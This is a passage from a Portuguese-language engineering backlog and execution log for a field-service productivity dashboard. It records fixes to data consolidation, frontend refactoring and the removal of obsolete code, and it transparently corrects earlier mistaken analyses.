    - Nenhuma tabela do design faltando no banco.
    - Mapa completo migração→tabela em `db/README.md`.
  - **`team_daily_carteira` versionada**: criado
    `supabase/migrations/011_team_daily_carteira.sql` com o schema **conferido
    contra o dump real** (11 colunas, PK `(date,team_name)`, índice
    `idx_tdc_regional`). Reconstrução a partir do código (write/read) bateu 1:1
    com o `pg_dump`.
  - **Obsoleto removido**: `migrations/add_note_rejections.sql` deletado —
    definia `reason_codes/reason_labels/rejected_at`, mas o banco real e o
    código usam `motivo_codes/motivo_textos/rejection_date` (de
    `supabase/migrations/008`, que evoluiu com `observacao/formulario/
    collaborator_*`). Confirmado contra o dump antes de deletar.
  - **Desvio do plano (transparente):** a migração foi pra
    `supabase/migrations/011_…` (sequência numerada já existente e aplicada
    pelo `migrate-from-supabase.sh`), **não** pra `db/migrations/` como o plano
    sugeria — criar um 3º diretório de migração, que nenhum runner conhece,
    deixaria a migração órfã de novo. Sem migração de dados; só arquivos SQL/docs
    (nenhum restart necessário).

## P2-8 — Extrair CSS pra `css/app.css` (primeiro passo do split)

- **Categoria:** Frontend
- **Status:** **done** (22/07/2026) — código feito; **falta você validar
  visualmente** (ver "Feito em" + checklist do aceite).
- **Fonte:** Auditoria de frontend 2026-07-08
- **Evidência:** `index.html` linhas 20-4279 são `<style>` — 4.259 linhas
  de CSS num único arquivo com HTML e JS. Encolhe o monolito em 33% sem
  risco de quebrar JS.
- **Impacto:** Valida o padrão de servir assets separados (pré-requisito
  pro split do JS em P3-2). Melhora tempo de load e cache.
- **Ação:**
  1. Copiar linhas 20-4279 pra `public/css/app.css`.
  2. `<link rel="stylesheet" href="css/app.css?v=YYYYMMDD">` no `<head>`
     do index.html.
  3. Remover o `<style>` interno.
  4. Testar visualmente todas as abas.
- **Aceite:**
  - [x] `index.html` encolheu ~4200 linhas (12.886 → 8.628; CSS em
    `public/css/app.css`, 4.264 linhas).
  - [ ] Zero regressão visual em Monitor, Rejeições, Gráficos, Ranking,
    Mapa, Deslocamentos, Notas, Histórico, Metas. **(validação visual do José
    pendente — o teste automatizado só garante que o CSS é servido, não o
    render de cada aba)**
- **Esforço:** 2-3h.
- **Rollback:** Reverter commit.
- **Depende de:** P2-3 (`public/` criado).
- **Feito em:** 22/07/2026.
  - Extraído o bloco `<style>` grande do `<head>` (era `index.html:20-4279`,
    4.258 linhas) pra `public/css/app.css`; substituído por
    `<link rel="stylesheet" href="css/app.css" />` no `<head>`. `index.html`:
    12.886 → 8.628 linhas.
  - **Nenhum `url()` relativo nem `@import`** no bloco (conferido antes de
    mover), então trocar a base pro `/css/` foi seguro. Servido de `public/`
    (P2-3); CSP já libera (`style-src 'self'`), sem mudança.
  - **Não movido de propósito:** os 4 blocos `<style>` PEQUENOS inline no body
    (componentes) ficaram — o backlog pede só o bloco grande ("1º passo").
    Split deles/do JS é o P3-2.
  - +1 teste (`GET /css/app.css` → 200 `text/css` com `--verde`). Suíte 267/267.
  - **⚠️ Validação visual (SUA):** o teste garante que o CSS é servido, mas não
    o render. Depois do deploy, passe pelas abas Monitor, Rejeições, Gráficos,
    Ranking, Mapa, Deslocamentos, Notas, Histórico, Metas e confirme que nada
    ficou sem estilo. Se algo quebrar, é rollback trivial (reverter o commit).
  - **Deploy:** arquivos (`public/index.html`, `public/css/app.css`), sem
    migração. `git pull` + PM2.

## P2-9 — Watchdog externo (UptimeRobot/BetterStack)

- **Categoria:** Operação
- **Status:** pending
- **Fonte:** CTO review 2026-07-08
- **Evidência:** P1-1 é watchdog interno (no crontab da mesma VM). Se a
  VM cair, o watchdog cai junto — não alerta. Precisa de monitoria
  externa.
- **Impacto:** VM inteira offline não gera alerta. Contrato com SLA (P2-N
  a definir com EDP) fica sem prova de uptime.
- **Ação:**
  1. Criar conta gratuita UptimeRobot (free tier 50 monitores, 5min interval)
     ou BetterStack.
  2. Adicionar monitor apontando pro `/health` (público? ou expor um
     `/health-public` sem auth com JSON mínimo).
  3. Configurar alerta pra email/Teams do José + backup humano.
  4. Salvar credenciais no cofre P0-1.
- **Aceite:**
  - [ ] Monitor externo ativo.
  - [ ] Teste: PM2 parado 10min → alerta chega.
- **Esforço:** 1h.
- **Rollback:** Deletar monitor.
- **Depende de:** P1-2 (`/health` real).

## P2-10 — Persistir estado do `_reclassifyJob`

- **Categoria:** Backend
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** `routes/index.js:1733` — `_reclassifyJob` é variável de
  módulo em memória. `_runReclassifyBackground` roda ~80 linhas de pipeline
  async. OOM ou deploy no meio → cliente que faz poll em
  `/admin/subcat-reclassify/status` vê `job:null` pra sempre.
- **Impacto:** Job longo (reclassificação de subcategorias) sem persistência
  de progresso. Se cair, perde-se contexto.
- **Ação:**
  1. Persistir estado em `app_settings` com key `reclassify_job` a cada
     lote: `{running:true, done:N, total:M, startedAt, lastBatchAt}`.
  2. No boot do server, ler `reclassify_job` e marcar como `interrupted`
     se `running=true` (ninguém retomou; requer intervenção manual).
  3. Endpoint `/admin/subcat-reclassify/status` lê do banco em vez da
     variável.
- **Aceite:** Status persiste após restart do PM2. ✓
- **Esforço:** 3-4h.
- **Rollback:** Reverter.
- **Depende de:** nada.
- **Feito em:** 22/07/2026.
  - Novo `services/reclassifyJobStore.js`: espelha o job em `app_settings`
    (key `reclassify_job`, JSONB) via `getSetting`/`setSetting`. Escrita
    **best-effort** (try/catch — falha de persistência nunca derruba o pipeline
    nem o boot). A memória segue sendo a fonte viva no processo; o banco é a
    cópia durável.
  - `_runReclassifyBackground` persiste em cada marco: ao calcular `total`, a
    cada lote (com `last_batch_at`), e em done/error. A POST persiste ANTES de
    disparar o background (status sobrevive mesmo se cair no 1º lote).
  - `GET /admin/subcat-reclassify/status` agora lê do banco (fallback pra
    memória se o banco cair) → **sobrevive a restart do PM2**.
  - **Boot** (`server.js` start): `reconcileOnBoot()` lê o job persistido; se
    estava `running` (ninguém retomou), marca `interrupted` — estado terminal,
    exige novo disparo manual. Best-effort (não derruba o boot).
  - Frontend (`index.html`): novo ramo pro status `interrupted` (mostra
    progresso parcial + "dispare de novo"), senão um job interrompido apareceria
    como "✓ concluída" — mentira sobre o resultado.
  - **Testes:** +9 em `test/reclassifyJobStore.test.js` (`reconcileBootState`
    puro: running→interrupted preservando progresso, done/error/interrupted
    intactos, null; `reconcileOnBoot` com load/save injetados). Suíte: 236/236.
  - **Deploy:** código (`routes/index.js`, `server.js`, `index.html`, novo
    service), sem migração — usa a `app_settings` existente. `git pull` + PM2.

---

## P1-17 — Junho mede +717 na re-consolidação (sinal invertido) — NÃO aplicar ainda

- **Categoria:** Dados (produção reportada à EDP)
- **Status:** pending — **investigação antes de qualquer apply**
- **Fonte:** `diag-impacto-reconsolidacao.js 2026-06-01 2026-06-30`, 31/07/2026,
  já com todos os fixes do dia no ar (P1-14, P1-15, P1-16).
- **Evidência:** **13.082 → 13.799 = +717 (+5,5%)** no recorte da whitelist —
  ou seja a tabela de junho **subconta**, o oposto de julho (−877). E o padrão
  por dia não é de um mecanismo único:
  - Positivos extremos: **23/06 +402 (+181,1%)**, 22/06 +160 (+37,6%),
    24/06 +123 (+27,4%), 28/06 +47 (+33,8%), 20/06 +50 (+25,8%), 10/06 +88.
  - Negativos: 08/06 −79, 15/06 −73, 16/06 −64, 25/06 −62, 12/06 −26.
  - Os **negativos** têm injeção alta de rejeição (273, 215, 243, 247, 150) →
    é a assinatura do P1-16, igual às sextas de julho. Coerente.
  - Os **positivos** não têm explicação por rejeição. Um dia com +181% significa
    tabela em 222 contra régua em 624 — isso é dia mal consolidado, não regra.
- **❌ LEITURA ERRADA, CORRIGIDA NO MESMO DIA.** Registrei aqui que "a cobertura de
  `note_rejections` só começa em 08/06" com base no salto das injeções
  (24 → 273). Errado: `diag-cobertura-rejeicoes.js` mostra **13.991 linhas de
  25/04 a 31/07**, e os dias de volume baixo são **fim de semana** (13/14, 20/21,
  27/28). Não há "início da coleta" no meio do mês.
- **✅ O QUE EXISTE SÃO BURACOS PONTUAIS — E ELES INVERTEM O SINAL DO DRY-RUN:**
  - `01/06` → **0** linhas · `02/06` → **0** (segunda e terça)
  - `09/06` → **1** linha · `10/06` → **1** (terça e quarta)
  - **A WPA limpa `notasRejeitadas` do payload após horas.** Quando esses dias
    foram consolidados AO VIVO, a rejeição estava no payload e foi descontada.
    Hoje a única fonte persistente é `note_rejections` — então re-consolidar um dia
    sem cobertura **devolve a nota rejeitada pra produção**. O `+88` do 10/06 no
    dry-run é REGRESSÃO, não correção.
  - 🚫 **Excluir do apply:** 01, 02, 09 e 10/06.
- **✅ CAUSA DOS POSITIVOS GRANDES: dias com consolidação PARCIAL (equipes inteiras
  zeradas).** `diag-drift-team.js 2026-06-23` (gravado 636, união_D 931,
  união_D+1 933 — as duas réguas concordam, então não é assimetria de janela):
  - **96 equipes com gap**, soma +170 / −465. Os −465 são equipes com
    `gravado = 0` tendo produção real nos snapshots: ETGPR15 0×51, ETCIT16 0×35,
    ETCIT18 0×35, ETALE15 0×28, ETCIT17 0×27, ETCIT15 0×18, ECCIT80 0×17…
  - **As zeradas são de fora de SJC** (ETCIT/ETALE/ETGPR/ECALE/ECMRT/EPANC/EPCIT/
    EBGPR/ECVGA…), enquanto as com `gravado > união` são **SJC** (ECCSJ83 21×7,
    ECCSJ82 15×2, ECCSJ86 12×1) — estas últimas são o P1-16 puro.
  - Leitura: **algum passe wipou 23/06 e reagregou só parte dos setores.** O wipe
    do `consolidateDay` apaga o dia INTEIRO; se a reagregação não cobre todos os
    setores, as equipes ausentes ficam sem linha nenhuma. É o risco do **P1-11**
    (sem transação) e/ou do **P1-13**. Produção perdida é REAL — os snapshots
    estão lá, as duas réguas veem.
- **Ação:**
  1. ✅ `diag-cobertura-rejeicoes.js 2026-06-01 2026-06-30` — buracos identificados.
  2. ✅ `diag-drift-team.js 2026-06-23` — confirmado: consolidação parcial por setor.
  3. ⬜ Repetir o `diag-drift-team` em **22/06 e 24/06** (o cluster) e em 28/06 e
     20/06 — confirmar o mesmo padrão de equipes zeradas antes de generalizar.
  4. ⚠️ **APLICADO em 31/07 — e o plano de PULAR dias tinha um FURO.** Rodado em
     dois trechos (`06-03→06-08` e `06-11→07-01`) pra pular 01, 02, 09 e 10/06.
     **Não funcionou:** o passe do 1º dia do intervalo wipa `{1ºdia-1, 1ºdia}`, então
     - `06-02` foi APAGADO e reescrito pelo passe de `06-03`;
     - `06-10` foi APAGADO e reescrito pelo passe de `06-11`;
     - `06-01` e `06-09` receberam upsert parcial (não foram wipados).
     Pra preservar um dia, o intervalo tem de começar **2 dias depois** dele. O
     `backfill-consolidate` agora avisa isso ao terminar.
     Saldos aplicados: trecho 1 (2.897 → 2.764 = −133), trecho 2 (15.058 → 14.526
     = −532) na tabela inteira.
  5. ⚠️ **`2026-07-01` ficou na régua de D** (era o último dia do trecho 2) — e
     julho é o mês reportado, já verificado. Precisa re-rodar julho pra selar.
  6. ❌ **A PREMISSA DA PROTEÇÃO ERA ERRADA — CONFIRMADO.** `diag-drift-team.js
     2026-06-10` (dia com 1 linha em `note_rejections`) depois de re-consolidado:
     `GRAVADO = UNIÃO_D+1 = 1106` exato, `UNIÃO_D = 928`, **53 equipes com gap e
     nenhuma zerada**, veredito do próprio script "HIPÓTESE CONFIRMADA". O `+88`
     que eu havia chamado de regressão era só a diferença de régua D vs D+1 — o
     mesmo engano do P0-6, pela **4ª vez**.
     Razão: `_unionTeamsFromSnapshots` une `notasRejeitadas` de **todos** os
     snapshots do dia (a cada 15min), então a rejeição sobrevive à
     re-consolidação. `note_rejections` é **suplemento** (pega o que a WPA limpou
     antes de qualquer snapshot), não fonte única.
     ⇒ **Não há dia a excluir do backfill.** Rodar o intervalo inteiro.
  7. ⚠️ `verify-consolidacao.js 2026-06-01 2026-06-30` — **3 dias com drift**, todos
     consequência dos itens 4 e 5 (nenhum é dado novo):
     - `06-01` tabela 685 × régua 710 (+25): dia "protegido", nunca consolidado.
     - `06-08` tabela 877 × régua 900 (+23): último dia do trecho 1, régua de D.
     - `06-13` tabela 259 × régua 252 (−7): resíduo pequeno, sábado.
     Os outros 27 dias `ok`, com 20 deles em diff **0** — o corpo de junho ficou
     consistente. Correção: re-rodar `06-02 → 07-01` (o passe de 06-02 wipa e
     regrava 06-01) e depois `07-01 → 07-31` pra selar julho.
  8. ✅ **Re-aplicado `06-02 → 07-01`** (+20 na tabela inteira, só os 3 dias
     pendentes) e **`07-01 → 07-31`** (+152, fechando o resíduo do P2-13 em julho).
  9. ✅ **VERIFICAÇÃO FINAL `06-01 → 07-31`: 58 dos 61 dias `ok`.** Os 3 restantes:
     - `06-05` tabela 420 × régua 393 (−27) — **P2-13**, e foi a 2ª passada que
       criou (antes estava 392 × 393). Ver a correção no P2-13.
     - `06-13` tabela 259 × régua 252 (−7) — **P2-13**, resistiu às duas passadas.
     - `07-31` (+6) — dia em curso, o cron das 00:15 sela.
     Nenhum dos três é o P1-16/P1-15: são acúmulo de upsert fora da janela de wipe.
  10. ✅ **TOTAIS FINAIS (31/07/2026, recorte da whitelist):**

      | mês | antes de hoje | depois | saldo |
      |---|---|---|---|
      | **junho** (01→30) | 13.082 | **13.764** | **+682 (+5,2%)** |
      | **julho** (01→30) | 14.998 | **14.064** | **−934 (−6,2%)** |
      | **os dois** | 28.080 | 27.828 | **−252 (−0,9%)** |

      Julho comparado só até o dia **30** de propósito — o dia 31 estava em curso
      nas duas medições (7 OS às 11:33, 151 às 14:31) e contaminaria o saldo.
      **Os dois meses quase se anulam**: julho cai ~6% (rejeitada que era contada
      como produção) e junho sobe ~5% (produção real perdida em consolidação
      parcial). Isso é o argumento pra auditoria — a correção não é uma
      "redução de produção", é a remoção de dois erros de sinais opostos.
      Resíduo restante: junho +0,3% (35 OS), julho +0,8% (113 OS) — é o **P2-13**.
  11. ⬜ Revisar esses números com o José antes de qualquer comunicação à EDP.
  8. ⬜ Medir maio (`diag-impacto-reconsolidacao.js 2026-05-01 2026-05-31`) e rodar
     a mesma checagem de cobertura antes de decidir.
- **Confirmação do padrão nos outros dias do cluster** (`diag-drift-team`):
  - `22/06`: gravado 913 · união 922/925 · líquido −9, mas +216/−225 por equipe —
    ETGPR15 0×46, ETPIU15 0×32 zeradas, e SJC inflada (ECTSJ88 29×13, ECTSJ80 15×2).
    Os dois efeitos quase se cancelam no total; por equipe, não.
  - `24/06`: gravado 597 · união 802/804 · líquido −205, com ETALE15 1×35,
    ETPIU15 0×33, ECPIU90 0×27, ETGPR16 0×21, ETMRT16 0×20 zeradas.
  - Padrão confirmado: **equipes inteiras sem linha, concentradas fora de SJC**.
    Consolidação parcial por setor, não questão de régua.
- **🐛 CURIOSIDADE A INVESTIGAR:** os passes de 26 e 27/06 gravaram linha para
  `"2026-01-16"` (`team_daily_totals_upserted dates ["2026-01-16", …]`) — data
  anterior ao início do projeto (abr/2026). Alguma nota tem `conclusionDate` de
  janeiro e o `_notaDate` a joga pra lá. Inofensivo hoje (ninguém consulta jan),
  mas indica que `_notaDate` aceita data arbitrária do payload sem sanity check.
- **Impacto da decisão:** re-consolidar junho **AUMENTA** a produção reportada em
  ~5,5%. Menos arriscado que reduzir, mas número que sobe depois de reportado
  também é questionável em auditoria — e pior, pode estar subindo por motivo
  errado. **Não aplicar às cegas.**
- **Esforço:** investigação 2–3h.
- **Relacionado:** P0-6, P1-11, P1-13, P1-16, P2-13. Maio ainda não medido.

---

## P2-13 — Upsert de dia antigo SOBRESCREVE em vez de somar (subconta ~0,8%)

- **Categoria:** Dados
- **Status:** pending — pequeno e na direção conservadora, mas é sistemático
- **Fonte:** resíduo que sobrou depois de fechar o P1-16 em 31/07/2026.
- **Evidência:**
  - `consolidateDay(D)` **wipa** só `{D-1, D}`, mas faz **upsert** de linhas pra
    vários `notaDate` anteriores (`_notaDate` devolve a nota pro dia da conclusão).
    Nos logs: o passe de 27/07 gravou `dates ["2026-07-20","2026-07-24","2026-07-25",
    "2026-07-26","2026-07-27"]`.
  - O upsert é por `(date, team_name, tipo_code)` com **replace**. O passe de D+3
    vê só as equipes que ainda carregam aquela nota, calcula um count PARCIAL pra
    `(D, equipe, tipo)` e **sobrescreve** o valor completo que o passe de D+1
    havia gravado. Último escritor ganha, mesmo com visão parcial.
  - Medido em julho após a re-consolidação: `diag-impacto-reconsolidacao.js` fica
    em **+114 OS (+0,8%)** — a tabela subconta ~4 OS/dia. Os últimos dias do
    intervalo dão 0 justamente porque tiveram menos passes posteriores.
- **Impacto:** ~0,8% do número reportado, e **as duas direções** — não só
  subnotificação. Correção de duas afirmações minhas de 31/07:
  1. ❌ *"direção conservadora, só subconta"* — **errado**. O upsert só substitui
     chaves que ele calcula; linhas de equipe/tipo que o passe selador não produziu
     **ficam** e se somam. Verificado em `06-05` após a 2ª re-consolidação de junho:
     tabela **420** contra régua **393** (+27, limiar 8) — o dia recebeu upsert dos
     passes de 06-07, 06-08, 06-09, 06-10 e 06-11 (todos listam `2026-06-05` em
     `dates`) sem nunca ser wipado de novo. Mesma coisa em `06-13` (259 × 252).
  2. ❌ *"rodar o backfill duas vezes fecha"* — **errado**. Em julho a 2ª passada
     fechou +152 de resíduo, o que me levou a essa conclusão; mas em junho a 2ª
     passada **criou** o desvio do 06-05. Não converge — embaralha. A correção
     tem de ser uma das 3 ações abaixo.
- **Consequência operacional (não é dano):** esses dias vão aparecer como
  `drift_nao_reparado` no log do sweep das 02:00 todas as noites, porque o guard do
  **P0-7** recusa reparo que subtrai. É ruído de log, e o guard está justamente
  impedindo que o sweep "conserte" pra baixo. Não silenciar sem resolver o P2-13.
- **Ação (candidatas, decidir antes de implementar):**
  1. Alargar o wipe pra cobrir TODAS as datas que o passe vai escrever (ex.:
     `D-3..D`) e reconstruí-las juntas — correto por construção, mais caro.
  2. Trocar o replace por união de note-ids nas datas fora da janela de wipe —
     exige retomar os ids já gravados, que hoje não são persistidos.
  3. Não escrever datas fora da janela de wipe e deixar o `verify-consolidacao`
     acusar — ⚠️ **perde** a nota que só aparece depois (era o ganho do P1-13).
- **Aceite:** `diag-impacto-reconsolidacao.js` de um mês inteiro em ~0 (hoje +0,8%),
  sem reintroduzir os sintomas do P1-13/P0-6 (verificar com `verify-consolidacao`).
- **Esforço:** 3–4h + medição. **Rollback:** reverter e re-consolidar.
- **Relacionado:** P1-13 (a razão de escrever datas antigas), P0-6/P0-7 (a mesma
  assimetria de janela vista por outro ângulo), P1-16.

---

## P2-11 — Andamento por equipe contava nota já concluída (dupla contagem)

- **Status:** **done** (fc2170d, 09/07/2026)
- **Categoria:** Frontend/Dados
- **Reportado por:** José Zouain (09/07/2026): "temos equipes executando
  mais de uma nota ao mesmo tempo, isso está gerando dúvida na
  acertividade dos números que estamos mostrando".
- **Evidência:** query em EPICO30 devolveu `andamento=3, também_concluídas=1,
  concluídas=2` — 1 das 3 "em andamento" já estava em `notasConcluidas`.
  Código: `index.html` card por equipe contava `(t.notasExecutadas||[])`
  cru, sem excluir ids já concluídos/rejeitados. O card AGREGADO
  (`renderMetrics`) já excluía concluídas; o card por equipe,
  `carteiraInicialDe` e a aba de detalhe do modal, não.
- **Causa raiz:** o WPA acumula em `notasExecutadas` toda nota que a equipe
  abriu no dispositivo — inclusive as já concluídas na mesma sessão. Uma
  nota em transição (executando → concluída) aparecia em 2 buckets, violando
  a invariante "cada UUID em exatamente 1 estado".
- **Impacto:** card por equipe e carteira inicial daquela equipe inflados;
  gerava desconfiança na acertividade. **NÃO afetava produtividade reportada
  à EDP** (essa conta só `notasConcluidas` via `_aggregateTeamDailyTotals`).
- **Ação (feita):**
  1. Helper `_notasEmAndamento(t)` como fonte única: `notasExecutadas`
     menos ids já em concluídas/rejeitadas (estados terminais).
  2. `_andamentoReal(t,de,ate)` aplica o range por cima. Usado no card por
     equipe e em `carteiraInicialDe` (que somava andamento inflado).
  3. Card agregado passou a excluir também rejeitadas (antes só concluídas).
  4. Aba "Em Andamento" do modal + `renderNotas('executada')` usam a lista
     deduplicada — número da aba bate com o card.
  5. Tooltip no card explicando o significado de "Andamento".
- **Aceite:** ✅ card do EPICO30 mostra andamento=2 (as 2 realmente
  iniciadas); ✅ suíte 196/196; ✅ equipe com N notas legítimas em curso
  segue mostrando N (não mascara número real).
- **Rollback:** `git revert fc2170d`.
- **Nota de princípio:** não é manipulação de número — remove dupla
  contagem de um estado terminal. Alinhado à regra 7 do CLAUDE.md
  (aritmética fecha por construção; corrigir a origem, não a exibição).

---

# P3 — Baixa prioridade (higiene, faça se sobrar tempo)

## P3-1 — Dividir `routes/index.js` por domínio

- **Categoria:** Backend
- **Status:** pending
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** `routes/index.js` = 2.755 linhas, ~60 rotas, 12 domínios.
- **Impacto:** Manutenibilidade. Não é urgente, mas cada mudança fica mais
  arriscada.
- **Ação:** Extrair um domínio por PR (começar por `debug` + `admin`,
  ~1.200 linhas juntos). Preservar `routes/index.js` como orquestrador
  (mount + middlewares).
- **Aceite:** `routes/index.js` < 500 linhas ao fim.
- **Esforço:** 1-2 semanas incremental.
- **Rollback:** Cada PR é rollback-able.
- **Depende de:** P2-1 (testes de contrato pra garantir zero regressão).

## P3-2 — Split incremental do `index.html`

- **Categoria:** Frontend
- **Status:** pending
- **Fonte:** Auditoria de frontend 2026-07-08
- **Evidência:** 12.832 linhas, 286 funções globais, 56 lets soltos.
- **Impacto:** Manutenibilidade. Onboarding de novo dev demora semanas.
- **Ação:** JS em arquivos ordenados `public/js/00-auth.js`, `01-constants.js`,
  `02-state.js`, `10-multiselect.js`, `20-monitor.js`, ..., `90-boot.js`
  via `<script src>` clássicos. Sem bundler.
- **Aceite:** `index.html` só HTML + `<link>` + `<script>` refs.
- **Esforço:** 3-4 semanas incremental.
- **Rollback:** Cada aba é PR separado, rollback-able.
- **Depende de:** P2-8 (CSS já extraído).

## P3-3 — Error handler central do Express

- **Categoria:** Backend
- **Status:** pending
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** 65 ocorrências de `res.status(500).json({error: err.message})`
  em `routes/index.js`.
- **Ação:** `app.use((err, req, res, next))` em `server.js` com request-id
  + resposta genérica. Helper `asyncHandler(fn)` migrado gradualmente.
- **Aceite:** Nenhum novo handler precisa de try/catch inline.
- **Esforço:** meio dia + migração gradual.
- **Depende de:** P3-1 (fica natural no split de rotas).

## P3-4 — Serialização temporal do cron

- **Categoria:** Backend
- **Status:** pending
- **Fonte:** Auditoria de pipeline 2026-07-08
- **Evidência:** `upsertSubcatTotals` intraday pode rodar depois do wipe do
  `consolidateDay` e re-inserir linhas parciais.
- **Ação:** Flag `_consolidating: Set(dates)` bloqueia upsert intraday em
  datas em consolidação.
- **Esforço:** meio dia.
- **Depende de:** P0-3 (consolidação transacional).

## P3-5 — Cap de range em endpoints de histórico

- **Categoria:** Dados
- **Status:** pending
- **Evidência:** `db/queries.js:950, 230, 616` carregam JSONB completo dos
  snapshots. Export de 60+ dias pode causar OOM.
- **Ação:** Rejeitar range > 62 dias com 400 nas rotas de export/histórico.
- **Esforço:** 1h.

## P3-6 — Índice de expressão em `note_details`

- **Categoria:** Dados
- **Status:** pending
- **Evidência:** `db/deslocamentosQueries.js:150-163` filtra por
  `(payload->'checkpoints'->0->>'timestamp')::timestamptz` sem índice.
- **Ação:** `CREATE INDEX idx_nd_first_cp ON note_details ((payload->'checkpoints'->0->>'timestamp'))`.
- **Esforço:** 30min.

## P3-7 — `pg_advisory_xact_lock` no `pushTeams`

- **Categoria:** Dados
- **Status:** pending
- **Evidência:** `dataWriter.js:16-19,64-70` — lock in-process. Se um dia
  escalar PM2 pra 2 instâncias, quebra.
- **Ação:** Substituir por advisory lock via Postgres (cross-process).
- **Esforço:** 2h.

## P3-8 — Remover código morto Vercel/Supabase-remote

- **Categoria:** Backend
- **Status:** **done** (22/07/2026) — feito junto com a **Fase 4** (cutover +
  aposentadoria do Vercel). Spec: `specs/aposentar-vercel-supabase-remote.md`.
- **Evidência:** `server.js:101-102` branch `VERCEL`; `vercel.json` na raiz;
  `routes/cron.js:1-15` doc de Vercel Cron; `dbClient.js:34-41` modo
  supabase; `@supabase/supabase-js` no `package.json`.
- **Ação:** Remover. Historia fica no git.
- **Esforço:** meio dia.
- **Feito em:** 22/07/2026 (Fase 4 + P3-8, do spec via `/spec`).
  - `vercel.json` deletado. Branches `process.env.VERCEL` removidos
    (`server.js` guard, `logger.js` IS_PROD, campos VERCEL do endpoint de
    diagnóstico, teste `IS_PROD com VERCEL=1`). Grep de `process.env.VERCEL` no
    repo → zero.
  - `dbClient.js` agora é **pg-only** (removido o branch supabase, o
    `createClient` e a URL hardcoded do projeto Supabase); sem `DATABASE_URL` →
    erro claro. Dependência `@supabase/supabase-js` removida do `package.json`
    + lock + `node_modules` (`npm uninstall`; `npm ls` → empty).
  - Modo `DATA_MODE=supabase` removido (branch no `/teams`); só `wpa`/`mock`
    válidos. Comentários/headers de `sbq()`, `cron()`, `db/queries.js` e
    `routes/cron.js` de-Vercelizados.
  - Deletados os 2 scripts que batiam no Supabase remoto
    (`scripts/migrate-supabase-to-local.js`, `scripts/diag-rejection-endpoints.js`).
  - **Correção durante o build:** `getTeamsFromSupabase` NÃO era órfã (o grep
    de aceite pegou 2 call-sites vivos que leem `teams_current` via pgShim);
    em vez de deletar, foi **renomeada** `getTeamsCurrent` (nome honesto) e os
    call-sites atualizados. Ver seção 10 do spec.
  - **Deploy (VM):** `git pull` + `npm prune` (funciona na VM) + restart PM2.
    `.env` (SUPABASE_*) fica pra limpar depois — inerte após esta mudança.
  - Suíte 266/266.

## P3-9 — Constantes duplicadas em módulo único

- **Categoria:** Backend
- **Status:** pending
- **Evidência:** `['DESG','DEPT','DESC','DSSJ']` em 4 lugares;
  `ENGELMIG_COMPANY_ID` em 3.
- **Ação:** Exportar `SETORES` e `ENGELMIG_COMPANY_ID` de `services/regionals.js`
  (extensão do módulo pequeno já existente).
- **Esforço:** 1h.

## P3-10 — Acessibilidade básica

- **Categoria:** Frontend
- **Status:** pending
- **Evidência:** Grep confirma 0 `aria-*`, 0 `role`, 0 `tabindex`. 22
  divs/spans com `onclick`.
- **Ação:** Trocar interativos por `<button>` estilizado. Adicionar
  `role="tablist"/tab` nas abas. Faça oportunisticamente ao mexer em cada
  aba pelo split (P3-2).
- **Esforço:** distribuído ao longo do split.

## P3-11 — "Andamento" ao vivo retém notas transferidas/canceladas no meio do dia

- **Categoria:** Dados/Frontend
- **Status:** **done** (22/07/2026) — `_accRecord` passou a sobrescrever o status
  acumulado (upgrade executada→concluida→rejeitada, nunca congela) e `_accApply`
  só re-injeta andamento acumulado quando o payload da equipe veio VAZIO (fallback
  de falha de coleta); com payload íntegro, andamento = ao vivo. Concluídas/
  rejeitadas seguem re-injetando sempre (produção + poda de rejeição preservadas).
  Coberto por `test/accumulator.test.js` (7 testes: transferida sai do andamento,
  guard de payload vazio, upgrade de estado, poda de rejeição, no-dup relogin).
- **Fonte:** Auditoria de veracidade 22/07/2026 (`scripts/audit-indicadores.js`,
  2 rodadas independentes).
- **Evidência:** ~8 notas (em 111 equipes) apareciam em "andamento" no painel
  com UUIDs ausentes de TODAS as listas ao vivo da WPA do dia (ex.: equipes
  ECGPR82, ECGPR90, EPANC30, EPGPR31/32, EPCIT30, EPPIU31 — UUIDs tipo
  `9573b78a…`, `fffce16e…`, estáveis entre as duas rodadas). Causa: o acumulador
  `_acc` (services/wpaService.js) preserva `notasExecutadas` vistas durante o
  dia (necessário pra sobreviver a relogins), mas nada as remove quando a EDP
  transfere/cancela a nota no meio do dia — ela some do payload e fica retida
  como "andamento" até o dia virar.
- **Impacto:** BAIXO — "andamento" é transiente e NÃO entra na produtividade
  reportada à EDP (que conta só concluídas). Infla o card "Em andamento" em
  ~1 nota nas equipes afetadas.
- **Ação:** no merge do `_acc`, remover de `notasExecutadas` acumuladas as notas
  que (a) não estão em nenhum bucket do payload atual E (b) não estão em
  concluídas/rejeitadas — i.e., tratá-las como saída de carteira (transferida/
  cancelada), espelhando o diff 1º/último snapshot do dia (`_buildDiaSummary`).
  Cuidado pra NÃO remover em falha de coleta (payload vazio por erro ≠ nota
  transferida) — só remover quando o payload da equipe veio íntegro.
- **Aceite:** auditoria (`audit-indicadores.js`) sem UUIDs hex órfãos em
  "andamento" em 2 rodadas consecutivas; nenhuma regressão em relogin
  (teste ECCSJ82 continua verde).
- **Esforço:** 2-4h (a parte difícil é o guard de payload íntegro).
- **Rollback:** reverter o commit.

---

# Log de execução

Ao concluir um item, mova pra cá com data + hash do commit:

- **2026-07-08 · `a8dcbab`** — **P0-4** e **P0-5** concluídos. `enforceTeamRegional`
  e POST `/metas` deixaram de ler `req.user.regional` (singular, morto no v=2)
  e passaram a usar `req.user.regionals` (array). Bônus: `server.js` só faz
  `listen()` quando executado direto (`require.main === module`), destravando
  testes de contrato. Novo `test/routes.test.js` (primeiro teste de rota do
  projeto) cobre login + o fix P0-5. Suíte 152→158.

- **2026-07-08 · `f8b839b`** — **P0-3** concluído (partes A, B, C):
  - A: extraído `_aggregateTeamDailyTotals` (puro), `_sessionDate`/`_notaDate`
    exportados. `test/dataWriter.test.js` — 14 casos travando a regra de
    atribuição de dia.
  - B: `test/diaSummary.test.js` — 8 casos com pool fake travando a aritmética
    de buckets e a invariante `inicial+entradas = atual+and+conc+rej+canc`.
  - C: `runDailyDriftSweep` varre D-1..D-7 (era só D-1 e D-7). Mitiga o
    `consolidateDay` não-atômico (crash que zere um dia é reparado até 02:00).
  - A **transação atômica do `consolidateDay`** foi deliberadamente rebaixada
    pra **P1-11**: reescrever o coração da consolidação sem staging tem risco
    maior de corromper números do contrato do que a rara janela de crash (ms
